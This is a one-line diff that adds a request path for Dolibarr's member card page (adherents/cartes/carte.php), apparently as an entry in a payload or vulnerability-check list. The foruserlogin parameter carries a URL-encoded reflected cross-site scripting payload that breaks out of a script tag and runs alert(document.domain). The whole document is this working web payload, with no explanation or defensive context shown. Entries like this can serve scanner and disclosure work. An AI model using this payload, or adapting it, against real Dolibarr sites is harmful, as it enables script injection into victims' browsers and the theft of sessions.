@@ -1,0 +1,1 @@
+/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print
